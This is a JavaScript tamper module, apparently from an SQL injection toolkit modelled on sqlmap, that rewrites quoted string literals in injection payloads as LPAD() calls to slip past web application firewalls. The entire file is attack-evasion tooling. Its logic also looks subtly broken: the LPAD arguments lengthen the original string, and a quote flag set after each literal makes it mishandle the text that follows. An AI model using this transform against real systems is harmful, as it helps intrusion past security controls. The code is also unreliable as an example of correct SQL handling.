// 字符串 → LPAD 包装：将字符串字面量包装为 LPAD(char,length,string) 调用
// 对标 sqlmap lpad.py，绕过 WAF 字符串检测
import { readSqlLiteral, isQuoteEscaped } from '../quoteScan.js';

export const lpad = {
  name: 'lpad',
  description: '将字符串字面量包装为 LPAD() 调用，绕过 WAF 字符串检测',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const src = String(payload ?? '');
    let out = '';
    let inSingle = false, inDouble = false;
    for (let i = 0; i < src.length; i++) {
      const ch = src[i];
      if (inSingle) {
        if (ch === "'" && !isQuoteEscaped(src, i)) { inSingle = false; out += ch; }
        else out += ch;
        continue;
      }
      if (inDouble) {
        if (ch === '"' && !isQuoteEscaped(src, i)) { inDouble = false; out += ch; }
        else out += ch;
        continue;
      }
      if (ch === "'") {
        inSingle = true;
        let str = '';
        { const lit = readSqlLiteral(src, i, "'"); if (!lit.closed) { out += src.slice(i); return out; } i = lit.end; str = lit.body; }
        out += `LPAD('${str}',${str.length + 1},'${str.slice(0, 1) || 'x'}')`;
      } else if (ch === '"') {
        inDouble = true;
        let str = '';
        { const lit = readSqlLiteral(src, i, '"'); if (!lit.closed) { out += src.slice(i); return out; } i = lit.end; str = lit.body; }
        out += `LPAD("${str}",${str.length + 1},"${str.slice(0, 1) || 'x'}")`;
      } else {
        out += ch;
      }
    }
    return out;
  },
};
export default lpad;
